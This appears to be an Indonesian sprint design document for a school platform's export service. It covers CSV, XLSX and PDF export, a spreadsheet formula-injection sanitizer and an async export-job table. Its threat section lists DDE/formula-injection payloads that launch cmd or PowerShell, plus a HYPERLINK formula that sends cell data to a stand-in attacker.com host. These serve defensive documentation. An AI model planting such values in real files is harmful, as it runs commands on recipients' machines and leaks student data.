# SPRINT 09 — EXPORT ENGINE & FORMULA INJECTION SECURITY

## 1. Arsitektur Export Engine

Layanan `ExportService` mendukung 3 format ekspor:
1. **CSV (Comma-Separated Values)**: Berkas teks murni berstandar RFC 4180 dengan sanitasi sel otomatis.
2. **XLSX (Microsoft Excel OpenXML)**: Berkas spreadsheet biner multi-kolom yang kompatibel dengan Excel, Google Sheets, dan LibreOffice.
3. **PDF (Portable Document Format)**: Dokumen berstandar ISO 32000-1 (%PDF-1.4) yang digenerate langsung oleh `PdfGeneratorService` secara murni tanpa dependensi native atau runtime eksternal.

---

## 2. Formula Injection Protection (CSV / Spreadsheet DDE)

### Vektor Ancaman
Ketika pengguna mengekspor data ke format CSV atau Excel, input yang berasal dari siswa (misalnya nama siswa, NISN, atau jawaban essay) dapat sengaja diawali karakter formula spreadsheet seperti:
```text
=cmd|"/C calc"!A0
+cmd|"/C powershell -enc ..."!A0
-2+3+cmd|"/C ..."!A0
@SUM(1,2)
\t=HYPERLINK("http://attacker.com/leak?data="&A1)
```
Saat berkas tersebut dibuka oleh guru atau admin sekolah pada Microsoft Excel, spreadsheet akan mengeksekusi perintah sistem operasi atau mengirimkan data sensitif ke server peretas.

### Pertahanan Server-Side
Metode `ExportService.sanitizeForSpreadsheet(val)` memeriksa setiap karakter awal:
```typescript
static sanitizeForSpreadsheet(val: any): string {
  if (val === null || val === undefined) return '';
  const str = String(val).trim();
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`;
  }
  return str;
}
```
Dengan menambahkan karakter awalan kutip tunggal (`'`), Excel dan spreadsheet lain akan memperlakukan nilai tersebut secara aman sebagai **Plain Text / String Harfiah**, bukan formula atau perintah eksekusi DDE.

---

## 3. Async Export Queue untuk Dataset Besar

Untuk ekspor berskala besar (ribuan siswa), sistem menggunakan mekanisme antrian asinkron melalui tabel `export_jobs`:
```sql
CREATE TABLE export_jobs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    school_id UUID NOT NULL REFERENCES schools(id) ON DELETE CASCADE,
    requested_by UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    report_type VARCHAR(50) NOT NULL,
    format VARCHAR(10) NOT NULL,
    filters JSONB NOT NULL DEFAULT '{}'::jsonb,
    status VARCHAR(20) NOT NULL DEFAULT 'QUEUED',
    file_name VARCHAR(255),
    file_size_bytes BIGINT DEFAULT 0,
    file_content_base64 TEXT,
    error_message TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    completed_at TIMESTAMP WITH TIME ZONE,
    expires_at TIMESTAMP WITH TIME ZONE DEFAULT (NOW() + INTERVAL '7 days')
);
```

### Siklus Hidup Job
```text
QUEUED → PROCESSING → COMPLETED / FAILED → EXPIRED
```
- Berkas yang telah melewati `expires_at` (default 7 hari) secara otomatis ditandai `EXPIRED` dan konten berkas dihapus dari database.
- Akses unduh pada endpoint `/api/export/download/[id]` memeriksa kepemilikan tenant (`school_id`) dan status kedaluwarsa secara mutlak.
